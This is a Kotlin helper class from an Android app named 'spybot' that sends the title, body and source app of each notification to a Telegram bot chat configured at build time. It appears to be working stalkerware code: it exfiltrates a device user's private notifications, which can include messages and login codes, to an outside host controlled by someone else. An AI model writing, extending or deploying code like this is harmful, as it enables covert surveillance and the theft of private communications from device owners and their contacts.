package com.example.spybot.helper

import android.content.Context
import com.example.spybot.BuildConfig
import com.example.spybot.network.TelegramApiService
import okhttp3.OkHttpClient
import okhttp3.logging.HttpLoggingInterceptor
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.TimeUnit

object TelegramHelper {

    private const val BASE_URL = "https://api.telegram.org/"
    
    // Read from BuildConfig generated by build.gradle.kts
    private val BOT_TOKEN = BuildConfig.BOT_TOKEN
    private val USER_CHAT_ID = BuildConfig.CHAT_ID

    private val logging = HttpLoggingInterceptor().apply {
        level = HttpLoggingInterceptor.Level.BODY
    }
    
    private val client = OkHttpClient.Builder()
        .addInterceptor(logging)
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private val retrofit = Retrofit.Builder()
        .baseUrl(BASE_URL)
        .client(client)
        .addConverterFactory(GsonConverterFactory.create())
        .build()

    private val apiService = retrofit.create(TelegramApiService::class.java)

    fun sendNotification(context: Context, title: String, body: String, packageName: String) {
        // Format the message nicely
        val message = "<b>New Notification!</b>\n\n" +
                "<b>App:</b> $packageName\n" +
                "<b>Title:</b> $title\n" +
                "<b>Body:</b> $body"

        // Send asynchronously so it doesn't block the UI thread
        apiService.sendMessage(USER_CHAT_ID, message).enqueue(object : Callback<com.example.spybot.utils.TelegramResponse> {
            override fun onResponse(call: Call<com.example.spybot.utils.TelegramResponse>, response: Response<com.example.spybot.utils.TelegramResponse>) {
                if (!response.isSuccessful) {
                    // You can log this error if needed
                    // android.util.Log.e("SpyBot", "Failed to send: ${response.code()}")
                }
            }

            override fun onFailure(call: Call<com.example.spybot.utils.TelegramResponse>, t: Throwable) {
                // Handle network errors (no internet, etc.)
                // android.util.Log.e("SpyBot", "Network Error: ${t.message}")
            }
        })
    }
}
